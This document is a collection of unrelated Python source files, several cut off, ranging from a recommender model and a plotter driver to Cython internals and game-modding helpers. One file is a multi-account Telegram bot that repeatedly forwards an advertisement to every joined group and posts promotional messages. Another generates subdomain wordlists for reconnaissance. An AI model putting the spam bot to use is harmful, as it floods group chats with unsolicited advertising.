    "import asyncio\nimport os\nimport json\nfrom telethon import TelegramClient, errors\nfrom telethon.errors import SessionPasswordNeededError\nfrom telethon.tl.functions.channels import LeaveChannelRequest  # Correct import for leaving channels\nfrom telethon.tl.functions.messages import GetHistoryRequest\nfrom telethon.tl.types import PeerUser\nfrom colorama import init, Fore\nimport pyfiglet\n\n# Initialize colorama for colored output\ninit(autoreset=True)\n\nCREDENTIALS_FOLDER = 'sessions'\n\n# Create a session folder if it doesn't exist\nif not os.path.exists(CREDENTIALS_FOLDER):\n    os.mkdir(CREDENTIALS_FOLDER)\n\ndef save_credentials(session_name, credentials):\n    path = os.path.join(CREDENTIALS_FOLDER, f\"{session_name}.json\")\n    with open(path, 'w') as f:\n        json.dump(credentials, f)\n\ndef load_credentials(session_name):\n    path = os.path.join(CREDENTIALS_FOLDER, f\"{session_name}.json\")\n    if os.path.exists(path):\n        with open(path, 'r') as f:\n            return json.load(f)\n    return {}\n\n# Function to display banner\ndef display_banner():\n    print(Fore.RED + pyfiglet.figlet_format(\"MUZZ-ADS\"))\n    print(Fore.GREEN + \"Made by @Muzzadbot\")\n\n# Function to login and forward messages\nasync def login_and_forward(api_id, api_hash, phone_number, session_name):\n    client = TelegramClient(session_name, api_id, api_hash)\n\n    await client.start(phone=phone_number)\n\n    try:\n        if await client.is_user_authorized() is False:\n            await client.send_code_request(phone_number)\n            await client.sign_in(phone_number)\n    except SessionPasswordNeededError:\n        password = input(\"Two-factor authentication enabled. Enter your password: \")\n        await client.sign_in(password=password)\n\n    saved_messages_peer = await client.get_input_entity('me')\n    \n    # Corrected GetHistoryRequest with missing arguments\n    history = await client(GetHistoryRequest(\n        peer=saved_messages_peer,\n        limit=1,\n        offset_id=0,\n        offset_date=None,\n        add_offset=0,\n        max_id=0,\n        min_id=0,\n        hash=0\n    ))\n\n    if not history.messages:\n        print(\"No messages found in 'Saved Messages'\")\n        return\n\n    last_message = history.messages[0]\n\n    # Ask how many times and delay after login\n    repeat_count = int(input(f\"How many times do you want to send the message to all groups for {session_name}? \"))\n    delay_between_rounds = int(input(f\"Enter the delay (in seconds) between each round for {session_name}: \"))\n\n    for round_num in range(1, repeat_count + 1):\n        print(f\"\\nStarting round {round_num} of forwarding messages to all groups for {session_name}.\")\n\n        async for dialog in client.iter_dialogs():\n            if dialog.is_group:\n                group = dialog.entity\n                try:\n                    await client.forward_messages(group, last_message)\n                    print(Fore.GREEN + f\"Message forwarded to {group.title} using {session_name}\")\n                except Exception as e:\n                    print(Fore.RED + f\"Failed to forward message to {group.title}: {str(e)}\")\n                await asyncio.sleep(3)\n\n        if round_num < repeat_count:\n            print(f\"Delaying for {delay_between_rounds} seconds before the next round.\")\n            await asyncio.sleep(delay_between_rounds)\n\n    await client.disconnect()\n\n# Function to leave groups where you can't send messages\nasync def leave_unwanted_groups(client):\n    async for dialog in client.iter_dialogs():\n        if dialog.is_group:\n            group = dialog.entity\n            try:\n                await client.send_message(group.id, \"dm @Muzzadbot\")\n                print(Fore.GREEN + f\"Message sent to {group.title}\")\n            except Exception as e:\n                print(Fore.RED + f\"Leaving {group.title} as message sending failed: {e}\")\n                await client(LeaveChannelRequest(group))\n                print(Fore.YELLOW + f\"Left group {group.title}\")\n\nasync def main():\n    display_banner()\n\n    # Load sessions and ask how many to log in\n    num_sessions = int(input(\"Enter how many sessions you want to log in: \"))\n    tasks = []\n\n    for i in range(1, num_sessions + 1):\n        session_name = f'session{i}'\n        credentials = load_credentials(session_name)\n\n        if credentials:\n            print(f\"\\nUsing saved credentials for session {i}.\")\n            api_id = credentials['api_id']\n            api_hash = credentials['api_hash']\n            phone_number = credentials['phone_number']\n        else:\n            print(f\"\\nEnter details for account {i}:\")\n            api_id = int(input(f\"Enter API ID for session {i}: \"))\n            api_hash = input(f\"Enter API hash for session {i}: \")\n            phone_number = input(f\"Enter phone number for session {i} (with country code): \")\n\n            credentials = {\n                'api_id': api_id,\n                'api_hash': api_hash,\n                'phone_number': phone_number\n            }\n            save_credentials(session_name, credentia",
    "import os\nimport subprocess\nimport argparse\nfrom concurrent.futures import ThreadPoolExecutor\n\nOUTPUT_FILE = \"wordlist.txt\"\n\ndef run_subfinder(domain):\n    try:\n        result = subprocess.run(\n            [\"subfinder\", \"-d\", domain, \"-silent\"],\n            capture_output=True, text=True, check=True\n        )\n        return result.stdout.splitlines()\n    except subprocess.CalledProcessError as e:\n        print(f\"Error while running subfinder for {domain}: {e}\")\n        return []\n\ndef extract_words(subdomains):\n    words = set()\n    for subdomain in subdomains:\n        words.update(subdomain.replace('-', '.').split('.'))\n    return words\n\ndef process_domain(domain):\n    print(f\"[INFO] Processing: {domain}\")\n    subdomains = run_subfinder(domain)\n    words = extract_words(subdomains)\n    print(f\"[INFO] Done: {domain} - {len(subdomains)} subdomains, {len(words)} words\")\n    return words\n\ndef main(input_file, threads):\n    if not os.path.exists(input_file):\n        print(f\"Input file {input_file} not found.\")\n        return\n\n    all_words = set()\n    with open(input_file, \"r\") as f:\n        domains = [line.strip() for line in f.readlines()]\n\n    \n    with ThreadPoolExecutor(max_workers=threads) as executor:\n        futures = {executor.submit(process_domain, domain): domain for domain in domains}\n        for future in futures:\n            words = future.result()\n            all_words.update(words)\n\n\n    with open(OUTPUT_FILE, \"w\") as f:\n        for word in sorted(all_words):\n            f.write(f\"{word}\\n\")\n\n    print(f\"[INFO] Wordlist created: {OUTPUT_FILE} - {len(all_words)} unique words\")\n\nif __name__ == \"__main__\":\n    parser = argparse.ArgumentParser(description=\"Subdomain Wordlist Generator\")\n    parser.add_argument(\"-file-domain\", required=True, help=\"Path to the input file containing domains\")\n    parser.add_argument(\"-threads\", type=int, default=10, help=\"Number of threads to use (default: 10)\")\n    args = parser.parse_args()\n\n    main(args.file_domain, args.threads)\n",
    "import os\nfrom ssh_pymongo import MongoSession\n\nfrom dotenv import load_dotenv, dotenv_values\nload_dotenv()\n\nclass MongoInstance(MongoSession):\n\n     def __init__(self, databaseName:str) -> None:\n          self.client = MongoSession(\n               host=str(os.getenv(\"REMOTE_SERVER\")),\n               port=22,\n               user=str(os.getenv(\"SSH_USER\")),\n               password=str(os.getenv(\"SSH_AUTHENTICATION\")),\n               uri=str(os.getenv(\"MONGOSTRING\")))\n          \n          self.database = self.client.connection[databaseName]\n\n     def __repr__(self) -> str:\n               return(\"Databases available:\", self.client.list_database_names())\n\n     def select_collection(self, name:str):\n          if self.database[name] == None:\n               self.database.create_collection(name)\n               self.collection = self.database[name]\n          else:\n               self.collection = self.database[name]\n          \n     def insert_data(self, data):\n          self.collection.insert_one(data)\n\n     def update_data(self, query, new_values):\n          self.collection.update_many(query, new_values)\n\n     def delete_data(self, query):\n          self.collection.delete_many(query)\n\n     def retrieve_data(self, query):\n          return self.collection.find(query)\n\n     def aggregate(self, query):\n          return self.collection.aggregate(query)\n\n     def close(self):\n          self.client.close()\n\n     def find(self, query):\n          return self.collection.find(query)\n\n     def count_documents(self, query):\n          return self.collection.count_documents(query)\n    \n            \n            \n\n",
    "from functogui import App, intUi, strUi, floatUi, listUi, fileUi, imageFileReturn, folderUi\nfrom typing import Annotated\nfrom PIL import Image, ImageEnhance, ImageFilter, ImageDraw\n\nEFFECTS = [\"None\", \"Blur\", \"Contour\", \"Edge Enhance\", \"Sharpen\"]\n\ndef all_types_test(image_path: Annotated[str, fileUi] = \"\",\n                   folder_path: Annotated[str, folderUi] = \"\",\n                   brightness: Annotated[float, floatUi(min_value=0.0, max_value=2.0)] = 1.0,\n                   rotation: Annotated[int, intUi(min_value=0, max_value=360)] = 0,\n                   watermark: Annotated[str, strUi(min_length=0, max_length=20)] = \"\",\n                   effect: Annotated[str, listUi(values=EFFECTS)] = \"None\",\n                   color: tuple[int, int, int, int] = (255, 0, 0, 125),\n                   grayscale: bool = False\n                   ) -> Annotated[str, imageFileReturn]:\n    \n    print(f\"folder_path: {folder_path}\")\n\n    if not image_path:\n        return \"\"\n\n    try:\n        img = Image.open(image_path)\n        img = ImageEnhance.Brightness(img).enhance(brightness)\n\n        if img.mode != 'RGBA':\n            img = img.convert('RGBA')\n\n        if rotation:\n            img = img.rotate(rotation, expand=True)\n\n        if grayscale:\n            img = img.convert('L')\n        \n        if color:\n            print(color)\n            overlay = Image.new('RGBA', img.size, (0, 0, 0, 0))\n            draw = ImageDraw.Draw(overlay)\n            \n            width, height = img.size\n            square_size = min(width, height) // 3\n            x1 = (width - square_size) // 2\n            y1 = (height - square_size) // 2\n            x2 = x1 + square_size\n            y2 = y1 + square_size\n            \n            draw.rectangle([x1, y1, x2, y2], fill=color)\n            \n            if img.mode == 'RGBA':\n                img = Image.alpha_composite(img, overlay)\n            else:\n                img = Image.alpha_composite(img.convert('RGBA'), overlay)\n\n        if effect != \"None\":\n            if effect == \"Blur\":\n                img = img.filter(ImageFilter.BLUR)\n            elif effect == \"Contour\":\n                img = img.filter(ImageFilter.CONTOUR)\n            elif effect == \"Edge Enhance\":\n                img = img.filter(ImageFilter.EDGE_ENHANCE)\n            elif effect == \"Sharpen\":\n                img = img.filter(ImageFilter.SHARPEN)\n        \n        if watermark:\n            draw = ImageDraw.Draw(img)\n            text_pos = (10, 10)\n            draw.text(text_pos, watermark, fill=\"white\")\n        \n        ext = image_path.split(\".\")[-1].lower()\n        output_path = image_path.replace(f\".{ext}\", f\"_processed.{ext}\")\n        \n        if ext in ['jpg', 'jpeg']:\n            img = img.convert('RGB')\n        \n        img.save(output_path)\n        return output_path\n        \n    except Exception as e:\n        print(f\"Error processing image: {e}\")\n        return \"\"\n\nApp(all_types_test, width=500)",
    "import os, struct, json, sys, astor\nfrom ast import *\n\npypath = os.path.dirname(sys.argv[0])\njson_data = open(os.path.join(pypath, \"static_db/BBCF/command_db.json\")).read()\ncommand_db = json.loads(json_data)\njson_data = open(os.path.join(pypath, \"static_db/BBCF/named_values/move_inputs.json\")).read()\nmove_inputs = json.loads(json_data)\njson_data = open(os.path.join(pypath, \"static_db/BBCF/named_values/normal_inputs.json\")).read()\nnormal_inputs = json.loads(json_data)\njson_data = open(os.path.join(pypath, \"static_db/BBCF/upon_db/global.json\")).read()\nupon_db = json.loads(json_data)\njson_data = open(os.path.join(pypath, \"static_db/BBCF/slot_db/global.json\")).read()\nslot_db = json.loads(json_data)\n#Checking for a custom slot/upon db\ncharacter_name = sys.argv[1].replace(\"scr_\", \"\").split(\".\")[0]\nif character_name[:-2] == \"ea\":\n    character_name = character_name[:-2]\ntry:\n    upon_db.update(json.loads(open(os.path.join(pypath, \"static_db/BBCF/upon_db/\" + character_name + \".json\")).read()))\nexcept IOError:\n    pass\ntry:\n    slot_db.update(json.loads(open(os.path.join(pypath, \"static_db/BBCF/slot_db/\" + character_name + \".json\")).read()))\nexcept IOError:\n    pass\n\ncommand_db_lookup = {}\nslot_db_lookup = {}\nnamed_value_lookup = {}\nnamed_button_lookup = {}\nnamed_direction_lookup = {}\nupon_db_lookup = {}\n\nfor k, v in command_db.items():\n    v[\"id\"] = k\n    if \"name\" in v:\n        v[\"name\"] = v[\"name\"].lower()\n        command_db_lookup[v[\"name\"]] = v\n    else:\n        command_db_lookup[\"unknown\" + k] = v\nslot_db_lookup = {v.lower(): k for k, v in slot_db.items()}\nfor k, v in move_inputs.items():\n    named_value_lookup[v.lower()] = k\nfor k, v in normal_inputs['grouped_values'].items():\n    named_value_lookup[v.lower()] = k\nfor k, v in normal_inputs['button_byte'].items():\n    named_button_lookup[v.lower()] = k\nfor k, v in normal_inputs['direction_byte'].items():\n    named_direction_lookup[v.lower()] = k\nupon_db_lookup = {v.lower(): k for k, v in upon_db.items()}\n\nMODE = \"<\"\nGAME = \"bb\"\nerror = False\n\ndef decode_upon(s):\n    s = s.lower()\n    if s.replace(\"upon_\", \"\") in upon_db_lookup:\n        return int(upon_db_lookup[s.replace(\"upon_\", \"\")])\n    else:\n        return int(s.replace(\"upon_\", \"\"))\n\n\ndef decode_var(node):\n    if isinstance(node, UnaryOp):\n        return [0, -node.operand.value]\n    elif isinstance(node, Constant):\n        return [0, node.value]\n    elif node.id.lower().replace(\"slot_\", \"\") in slot_db_lookup:\n        return [2, int(slot_db_lookup[node.id.lower().replace(\"slot_\", \"\")])]\n    else:\n        try:\n            return [2, int(node.id.lower().replace(\"slot_\", \"\"))]\n        except ValueError:\n            raise Exception(\"unknown SLOT \" + node.id)\n\n\ndef write_command_by_name(name, params):\n    cmd_data = command_db_lookup[name.lower()]\n    write_command_by_id(cmd_data[\"id\"], params)\n\n\ndef write_command_by_id(id, params):\n    global output_buffer\n    cmd_data = command_db[id]\n    my_params = list(params)\n    for index, oValue in enumerate(my_params):\n        if isinstance(oValue, str):\n            pass\n        elif isinstance(oValue, int):\n            pass\n        elif isinstance(oValue, float):\n            pass\n        elif isinstance(oValue, Constant):\n            my_params[index] = oValue.value\n        elif isinstance(oValue, Name):\n            temp = named_value_lookup.get(oValue.id.lower())\n            if temp is not None:\n                my_params[index] = int(temp)\n            else:\n                if int(id) in [17, 29, 30, 21007]:\n                    upon = decode_upon(oValue.id)\n                    my_params[index] = upon\n                if int(id) in [43, 14001, 14012]:\n                    buttonstr = oValue.id[-1].lower()\n                    directionstr = oValue.id[:-1].lower()\n                    my_params[index] = (int(named_button_lookup[buttonstr]) << 8) + int(\n                        named_direction_lookup[directionstr])\n        elif isinstance(oValue, UnaryOp):\n            my_params[index] = -oValue.operand.value\n        else:\n            raise Exception(\"unknown type\" + str(type(oValue)))\n    output_buffer.write(struct.pack(MODE + \"I\", int(id)))\n    if \"format\" in cmd_data:\n        for i, v1 in enumerate(my_params):\n            if isinstance(v1, str):\n                my_params[i] = v1.encode()\n        output_buffer.write(struct.pack(MODE + cmd_data[\"format\"], *my_params))\n    else:\n        output_buffer.write(my_params[0].encode())\n\n\nclass Rebuilder(astor.ExplicitNodeVisitor):\n    def visit_Module(self, node):\n        global output_buffer\n        global root\n        root = node\n        state_count = 0\n        output_buffer.write(struct.pack(MODE + \"I\", state_count))\n        for function in node.body:\n            if type(function) != FunctionDef:\n                raise Exception(\"Root level elements must be functions\")\n            if function.decorator_list[0].id.lower() != \"state\":\n                continue\n            function._index = state_count\n            state_count += 1\n     ",
    "import serial\nimport time\nimport os\n\ndef load_hpgl_file(filepath):\n    \"\"\"\n    Load an HPGL file and split commands by semicolon.\n    \"\"\"\n    with open(filepath, 'r') as file:\n        data = file.read()\n    return [cmd + ';' for cmd in data.split(';') if cmd.strip()]\n\ndef process_commands(commands):\n    \"\"\"\n    Process commands to split `PD` or `PU` commands into standalone `PA x,y;` commands.\n    \"\"\"\n    processed_commands = []\n    for command in commands:\n        if command.startswith(\"PD\") or command.startswith(\"PU\") or command.startswith(\"PA\"):\n            # Extract coordinates from the command\n            prefix = command[:2]\n            processed_commands.append(prefix+\";\")\n            coordinates = command[2:].strip(\";\").split(\",\")\n            # Create individual PA commands for each coordinate pair\n            for i in range(0, len(coordinates), 2):\n                if i + 1 < len(coordinates):  # Ensure pairs exist\n                    x, y = coordinates[i], coordinates[i + 1]\n                    processed_commands.append(f\"PA {x},{y};\")\n        else:\n            processed_commands.append(command)\n    return processed_commands\n\ndef send_command(ser, command, address, debug_file=None):\n    \"\"\"\n    Send a command to the serial device or write to debug file.\n    \"\"\"\n    def write_debug(data):\n        if debug_file:\n            debug_file.write(data)\n\n    try:\n        # Step 1: Send \"wrt <address>\" and CR\n        wrt_command = f\"wrt {address}\\r\"\n        if ser:\n            time.sleep(0.001)\n            ser.write(wrt_command.encode())\n        write_debug(wrt_command)\n        print(wrt_command.encode())\n\n        # Step 2: Send the actual command and CR\n        actual_command = f\"{command}\\r\"\n        if ser:\n            time.sleep(0.001)\n            ser.write(actual_command.encode())\n        print(actual_command.encode())\n        write_debug(actual_command)\n\n        # Step 3: Send \"wrt <address>\" and CR, then \"OE\" and CR\n        wrt_oe_command = f\"wrt {address}\\r\"\n        oe_command = \"OE;\\r\"\n        if ser:\n            time.sleep(0.001)\n            ser.write(wrt_oe_command.encode())\n            time.sleep(0.001)\n            ser.write(oe_command.encode())\n        write_debug(wrt_oe_command)\n        print(wrt_oe_command.encode())\n        write_debug(oe_command)\n        print(oe_command.encode())\n        # Step 4: Send \"rd #1,<address>\" and CR\n        rd_command = f\"rd #1,{address}\\r\"\n        if ser:\n            time.sleep(0.001)\n            ser.write(rd_command.encode())\n        write_debug(rd_command)\n        print(rd_command.encode())\n\n        # Step 5: Wait for a reply\n        reply = \"\"\n        if ser:\n  #          while reply == \"\":\n            reply = ser.readline()\n            time.sleep(0.001)\n        else:\n            \n            reply = \"0\"  # Simulated reply for debug\n        \n        print(reply)\n        reply = reply.decode().strip()\n        #print(f\"Reply: {reply}\")\n        write_debug(f\"Reply: {reply}\\n\")\n\n        # Step 6: Check the first character of the reply\n        if reply and reply[0].isdigit() and int(reply[0]) >= 1:\n            print(f\"Device reply indicates pause: {reply}\")\n            time.sleep(1)  # Pause before resuming\n        else:\n            print(f\"Device reply indicates continue: {reply}\")\n    except Exception as e:\n        print(f\"Error during communication: {e}\")\n\ndef main():\n    # Load HPGL commands\n    filepath = input(\"Enter the path to the HPGL file: \").replace('\"', '')\n    if filepath==\"\":\n        default = True\n        filepath='C:/Users/Bosco/Nextcloud/Projekte/BoscoFab_3/Plotter_Code HPIB/shuttle.hpgl'\n    else:\n        default = False\n    if not os.path.exists(filepath):\n        print(\"File not found!\")\n        return\n    commands = load_hpgl_file(filepath)\n    print(f\"Loaded {len(commands)} commands from {filepath}.\")\n\n    # Process commands\n    processed_commands = process_commands(commands)\n    print(f\"Processed into {len(processed_commands)} standalone commands.\")\n\n    if default:\n        address = 5\n    else:\n        address = input(\"Enter the device address (e.g., 5): \")\n    # Configure serial connection or debug mode\n    debug_mode = input(\"Enable debug mode (write to file instead of serial)? (yes/no): \").strip().lower() == \"yes\"\n    debug_file = None\n    ser = None\n\n    if debug_mode:\n        if default:\n            debug_filepath='C:/Users/Bosco/Nextcloud/Projekte/BoscoFab_3/Plotter_Code HPIB/debug.output'\n        else:\n            debug_filepath = input(\"Enter the debug file path: \").replace('\"', '')\n        debug_file = open(debug_filepath, 'w')\n        print(f\"Debug mode enabled. Writing to {debug_filepath}.\")\n    else:\n        if default:\n            com_port = \"COM7\"\n        else:\n            com_port = input(\"Enter the COM port (e.g., COM3): \")\n        try:\n            ser = serial.Serial(\n                port=com_port,\n                baudrate=38400,\n                bytesize=serial.SEVENBITS,\n                stopbits=serial.STOPBITS_ONE,\n        ",
    "#\r\n#   Builtin Definitions\r\n#\r\n\r\nfrom __future__ import absolute_import\r\n\r\nfrom .StringEncoding import EncodedString\r\nfrom .Symtab import BuiltinScope, StructOrUnionScope, ModuleScope, Entry\r\nfrom .Code import UtilityCode, TempitaUtilityCode\r\nfrom .TypeSlots import Signature\r\nfrom . import PyrexTypes\r\n\r\n\r\n# C-level implementations of builtin types, functions and methods\r\n\r\niter_next_utility_code = UtilityCode.load(\"IterNext\", \"ObjectHandling.c\")\r\ngetattr_utility_code = UtilityCode.load(\"GetAttr\", \"ObjectHandling.c\")\r\ngetattr3_utility_code = UtilityCode.load(\"GetAttr3\", \"Builtins.c\")\r\npyexec_utility_code = UtilityCode.load(\"PyExec\", \"Builtins.c\")\r\npyexec_globals_utility_code = UtilityCode.load(\"PyExecGlobals\", \"Builtins.c\")\r\nglobals_utility_code = UtilityCode.load(\"Globals\", \"Builtins.c\")\r\n\r\nbuiltin_utility_code = {\r\n    'StopAsyncIteration': UtilityCode.load_cached(\"StopAsyncIteration\", \"Coroutine.c\"),\r\n}\r\n\r\n\r\n# mapping from builtins to their C-level equivalents\r\n\r\nclass _BuiltinOverride(object):\r\n    def __init__(self, py_name, args, ret_type, cname, py_equiv=\"*\",\r\n                 utility_code=None, sig=None, func_type=None,\r\n                 is_strict_signature=False, builtin_return_type=None,\r\n                 nogil=None):\r\n        self.py_name, self.cname, self.py_equiv = py_name, cname, py_equiv\r\n        self.args, self.ret_type = args, ret_type\r\n        self.func_type, self.sig = func_type, sig\r\n        self.builtin_return_type = builtin_return_type\r\n        self.is_strict_signature = is_strict_signature\r\n        self.utility_code = utility_code\r\n        self.nogil = nogil\r\n\r\n    def build_func_type(self, sig=None, self_arg=None):\r\n        if sig is None:\r\n            sig = Signature(self.args, self.ret_type, nogil=self.nogil)\r\n            sig.exception_check = False  # not needed for the current builtins\r\n        func_type = sig.function_type(self_arg)\r\n        if self.is_strict_signature:\r\n            func_type.is_strict_signature = True\r\n        if self.builtin_return_type:\r\n            func_type.return_type = builtin_types[self.builtin_return_type]\r\n        return func_type\r\n\r\n\r\nclass BuiltinAttribute(object):\r\n    def __init__(self, py_name, cname=None, field_type=None, field_type_name=None):\r\n        self.py_name = py_name\r\n        self.cname = cname or py_name\r\n        self.field_type_name = field_type_name  # can't do the lookup before the type is declared!\r\n        self.field_type = field_type\r\n\r\n    def declare_in_type(self, self_type):\r\n        if self.field_type_name is not None:\r\n            # lazy type lookup\r\n            field_type = builtin_scope.lookup(self.field_type_name).type\r\n        else:\r\n            field_type = self.field_type or PyrexTypes.py_object_type\r\n        entry = self_type.scope.declare(self.py_name, self.cname, field_type, None, 'private')\r\n        entry.is_variable = True\r\n\r\n\r\nclass BuiltinFunction(_BuiltinOverride):\r\n    def declare_in_scope(self, scope):\r\n        func_type, sig = self.func_type, self.sig\r\n        if func_type is None:\r\n            func_type = self.build_func_type(sig)\r\n        scope.declare_builtin_cfunction(self.py_name, func_type, self.cname,\r\n                                        self.py_equiv, self.utility_code)\r\n\r\n\r\nclass BuiltinMethod(_BuiltinOverride):\r\n    def declare_in_type(self, self_type):\r\n        method_type, sig = self.func_type, self.sig\r\n        if method_type is None:\r\n            # override 'self' type (first argument)\r\n            self_arg = PyrexTypes.CFuncTypeArg(\"\", self_type, None)\r\n            self_arg.not_none = True\r\n            self_arg.accept_builtin_subtypes = True\r\n            method_type = self.build_func_type(sig, self_arg)\r\n        self_type.scope.declare_builtin_cfunction(\r\n            self.py_name, method_type, self.cname, utility_code=self.utility_code)\r\n\r\n\r\nclass BuiltinProperty(object):\r\n    # read only for now\r\n    def __init__(self, py_name, property_type, call_cname,\r\n                 exception_value=None, exception_check=None, utility_code=None):\r\n        self.py_name = py_name\r\n        self.property_type = property_type\r\n        self.call_cname = call_cname\r\n        self.utility_code = utility_code\r\n        self.exception_value = exception_value\r\n        self.exception_check = exception_check\r\n\r\n    def declare_in_type(self, self_type):\r\n        self_type.scope.declare_cproperty(\r\n            self.py_name,\r\n            self.property_type,\r\n            self.call_cname,\r\n            exception_value=self.exception_value,\r\n            exception_check=self.exception_check,\r\n            utility_code=self.utility_code\r\n        )\r\n\r\n\r\nbuiltin_function_table = [\r\n    # name,        args,   return,  C API func,           py equiv = \"*\"\r\n    BuiltinFunction('abs',        \"d\",    \"d\",     \"fabs\",\r\n                    is_strict_signature=True, nogil=True),\r\n    BuiltinFunction('abs',        \"f\",    \"f\",     \"fabsf\",\r\n                    is_strict_signature=True, nogil=True),\r\n    BuiltinFunction('abs',        \"i\",",
    "# -*- coding: UTF-8 -*-\n# @Author  : Chenyang Wang\n# @Email   : THUwangcy@gmail.com\n\n\"\"\" NeuMF\nReference:\n    \"Neural Collaborative Filtering\"\n    Xiangnan He et al., WWW'2017.\nReference code:\n    The authors' tensorflow implementation https://github.com/hexiangnan/neural_collaborative_filtering\nCMD example:\n    python main.py --model_name NeuMF --emb_size 64 --layers '[64]' --lr 5e-4 --l2 1e-7 --dropout 0.2 \\\n    --dataset 'Grocery_and_Gourmet_Food'\n\"\"\"\n\nimport torch\nimport torch.nn as nn\n\nfrom models.BaseModel import GeneralModel\n\n\nclass NeuMF(GeneralModel):\n    reader = 'BaseReader'\n    runner = 'BaseRunner'\n    extra_log_args = ['emb_size', 'layers']\n\n    @staticmethod\n    def parse_model_args(parser):\n        parser.add_argument('--emb_size', type=int, default=64,\n                            help='Size of embedding vectors.')\n        parser.add_argument('--layers', type=str, default='[64]',\n                            help=\"Size of each layer.\")\n        return GeneralModel.parse_model_args(parser)\n\n    def __init__(self, args, corpus):\n        super().__init__(args, corpus)\n        self.emb_size = args.emb_size\n        self.layers = eval(args.layers)\n        self._define_params()\n        self.apply(self.init_weights)\n\n    def _define_params(self):\n        self.mf_u_embeddings = nn.Embedding(self.user_num, self.emb_size)\n        self.mf_i_embeddings = nn.Embedding(self.item_num, self.emb_size)\n        self.mlp_u_embeddings = nn.Embedding(self.user_num, self.emb_size)\n        self.mlp_i_embeddings = nn.Embedding(self.item_num, self.emb_size)\n\n        self.mlp = nn.ModuleList([])\n        pre_size = 2 * self.emb_size\n        for i, layer_size in enumerate(self.layers):\n            self.mlp.append(nn.Linear(pre_size, layer_size))\n            pre_size = layer_size\n        self.dropout_layer = nn.Dropout(p=self.dropout)\n        self.prediction = nn.Linear(pre_size + self.emb_size, 1, bias=False)\n\n    def forward(self, feed_dict):\n        self.check_list = []\n        u_ids = feed_dict['user_id']  # [batch_size]\n        i_ids = feed_dict['item_id']  # [batch_size, -1]\n\n        u_ids = u_ids.unsqueeze(-1).repeat((1, i_ids.shape[1]))  # [batch_size, -1]\n\n        mf_u_vectors = self.mf_u_embeddings(u_ids)\n        mf_i_vectors = self.mf_i_embeddings(i_ids)\n        mlp_u_vectors = self.mlp_u_embeddings(u_ids)\n        mlp_i_vectors = self.mlp_i_embeddings(i_ids)\n\n        mf_vector = mf_u_vectors * mf_i_vectors\n        mlp_vector = torch.cat([mlp_u_vectors, mlp_i_vectors], dim=-1)\n        for layer in self.mlp:\n            mlp_vector = layer(mlp_vector).relu()\n            mlp_vector = self.dropout_layer(mlp_vector)\n\n        output_vector = torch.cat([mf_vector, mlp_vector], dim=-1)\n        prediction = self.prediction(output_vector)\n        return {'prediction': prediction.view(feed_dict['batch_size'], -1)}\n",
    "import sys\nimport os\n\niniSeparator = \";\"+(\"-\"*20)\n\ndef fixName(name):\n    parts = name.split(\"-\")\n    for i in range(len(parts)):\n        parts[i] = parts[i].title()\n    return ''.join(parts)\n\ndef extractHash(name):\n    filename = os.listdir(f\"original/{name}\")[0]\n    return filename.split(\"-\")[0]\n\ndef getResourcePath(name):\n    files = os.listdir(f\"resources/{name}\")\n    if(len(files)>0):\n        return f\".\\\\resources\\\\{name}\\\\{files[0]}\"\n    return ''\n\ndef generateIniSection(name):\n    sectionName = fixName(name)\n    hash = extractHash(name)\n    resourcePath = getResourcePath(name)\n    if (resourcePath == ''):\n        lines = [\n            f\";[TextureOverride{sectionName}]\",\n            f\";hash = {hash}\",\n            f\";ps-t0 = Resource{sectionName}\",\n            \";\",\n            f\";[Resource{sectionName}]\",\n            f\";filename = {resourcePath}\",\n        ]\n    else:\n        lines = [\n            f\"[TextureOverride{sectionName}]\",\n            f\"hash = {hash}\",\n            f\"ps-t0 = Resource{sectionName}\",\n            \"\",\n            f\"[Resource{sectionName}]\",\n            f\"filename = {resourcePath}\",\n        ]\n    return lines\n\ndef findDuplicateSection(sections, section):\n    override = \"\"\n    for line in section:\n        if \"TextureOverride\" in line:\n            override = line.strip().replace(\";\", \"\")\n    for s in sections:\n        for line in s:\n            if override.strip() in line:\n                #print(\"preserving section \"+override)\n                trimmed = []\n                for l in s:\n                    sl = l.strip()\n                    if len(sl) > 1:\n                        trimmed.append(l.strip())\n                trimmed = trimmed[0:3]+[\"\"]+trimmed[3:]\n                return trimmed\n    print(\"adding new section \"+override)\n    return section\n\ndef parseFile(file):\n    section = []\n    sections = []\n    for line in file:\n        if iniSeparator in line:\n            sections.append(section)\n            section = []\n        else:\n            section.append(line)\n    print(f\"found {len(sections)} sections\")\n    return sections\n    \n\noriginal_names = os.listdir(\"original\")\nargs = sys.argv\nif (len(args)>1):\n    print(\"selective mode\");\n    original_names = args[1:]\n\nfiles = os.listdir(\".\")\nisFirst = True\nif \"mod.ini\" in files:\n    print(\"updating old file\")\n    iniFile = open(\"mod.ini\", \"r\")\n    oldsections = parseFile(iniFile)\n    iniFile.close()\n    os.remove(\"mod.ini\")\n    iniFile = open(\"mod.ini\", \"a\")\n    for name in original_names:\n        section = generateIniSection(name)\n        section = findDuplicateSection(oldsections, section)\n        if not isFirst:\n            iniFile.write('\\n')\n        for line in section:\n            iniFile.write(line+'\\n')\n        iniFile.write('\\n'+iniSeparator+'\\n')\n        isFirst = False\nelse:\n    print(\"generating new file\")\n    iniFile = open(\"mod.ini\", \"a\")\n    for name in original_names:\n        section = generateIniSection(name)\n        if not isFirst:\n            iniFile.write('\\n')\n        for line in section:\n            iniFile.write(line+'\\n')\n        iniFile.write('\\n'+iniSeparator+'\\n')\n        isFirst = False",
    "import pyautogui\r\nimport time\r\nimport os\r\nfrom colorama import Fore, Style, init\r\n\r\n# Initialize colorama for colored text\r\ninit(autoreset=True)\r\n\r\ndef get_map_coordinates(map_choice):\r\n    map_coords = {\r\n        1: (770, 430),  # CUSTOMS\r\n        2: (530, 560),  # SHORELINE\r\n        3: (520, 560),  # STREETS\r\n        4: (710, 390),  # FACTORY\r\n        5: (880, 515),  # INTERCHANGE\r\n        6: (440, 440)   # LIGHTHOUSE\r\n    }\r\n    return map_coords.get(map_choice)\r\n\r\ndef display_map_menu():\r\n    print(Fore.CYAN + \"\\nSelect a map:\")\r\n    print(Fore.WHITE + \"1. CUSTOMS\")\r\n    print(Fore.WHITE + \"2. SHORELINE\")\r\n    print(Fore.WHITE + \"3. STREETS\")\r\n    print(Fore.WHITE + \"4. FACTORY\")\r\n    print(Fore.WHITE + \"5. INTERCHANGE\")\r\n    print(Fore.WHITE + \"6. LIGHTHOUSE\")\r\n    print(Fore.WHITE + \"7. Exit\")\r\n    \r\n    while True:\r\n        try:\r\n            choice = int(input(Fore.YELLOW + \"\\nEnter your choice (1-7): \"))\r\n            if 1 <= choice <= 7:\r\n                return choice\r\n            else:\r\n                